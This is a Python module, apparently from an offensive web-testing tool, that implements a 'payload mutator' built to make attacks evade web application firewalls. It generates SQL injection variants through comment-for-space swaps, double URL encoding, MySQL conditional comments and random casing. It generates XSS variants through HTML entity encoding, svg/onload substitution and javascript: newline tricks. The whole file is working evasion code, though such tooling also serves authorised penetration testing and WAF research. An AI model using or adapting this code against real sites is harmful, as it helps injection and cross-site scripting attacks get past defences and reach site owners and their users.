"""
core/wraith/mutator.py
The Genetic Mutation Engine.
Breaks payloads into genes and evolves them to bypass WAF filters.
"""

import random
import urllib.parse
from typing import List, Callable

class PayloadMutator:
    """
    Library of obfuscation and mutation strategies.
    future: Use Genetic Algorithm to mix and match these.
    """

    @staticmethod
    def mutate_sql(payload: str) -> List[str]:
        """
        Generates variants of a SQL injection payload.
        """
        variants = []
        
        # 1. Whitespace Evasion (/**/ comments)
        variants.append(payload.replace(" ", "/**/"))
        
        # 2. URL Encoding
        variants.append(urllib.parse.quote(payload))
        
        # 3. Double URL Encoding
        variants.append(urllib.parse.quote(urllib.parse.quote(payload)))
        
        # 4. MySQL Conditional Comment
        if "union" in payload.lower():
            variants.append(payload.replace("union", "/*!12345union*/"))
        
        # 5. Case Toggling (RaNdOm)
        variants.append("".join(
            c.upper() if random.random() > 0.5 else c.lower() for c in payload
        ))

        return variants

    @staticmethod
    def mutate_xss(payload: str) -> List[str]:
        """
        Generates variants of an XSS payload.
        """
        variants = []
        
        # 1. Base64 (Assuming context allows logic decoding)
        # (Skipping for raw injection unless we wrap in eval)
        
        # 2. HTML Entities
        # alert(1) -> &#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;
        variants.append("".join(f"&#{ord(c)};" for c in payload))
        
        # 3. SVG/OnLoad context
        if "<script>" in payload:
            variants.append(payload.replace("<script>", "<svg/onload="))
            
        # 4. Javascript Pseudo-Protocol w/ Newline
        if "javascript:" in payload:
            variants.append(payload.replace("javascript:", "javascript://%0A"))
            
        return variants

    @staticmethod
    def generic_obfuscation(payload: str) -> List[str]:
        """
        General purpose bypasses.
        """
        return [
            payload + ";",  # Semicolon terminator
            payload + " -- -", # Comment terminator
            f"/*{payload}*/" # Comment wrapping
        ]

    def evolve(self, payload: str, type: str = "generic") -> List[str]:
        """
        Main entry point. Returns a list of mutated candidates.
        """
        pool = []
        if type == "sql":
            pool.extend(self.mutate_sql(payload))
        elif type == "xss":
            pool.extend(self.mutate_xss(payload))
            
        pool.extend(self.generic_obfuscation(payload))
        
        # Dedup
        return list(set(pool))
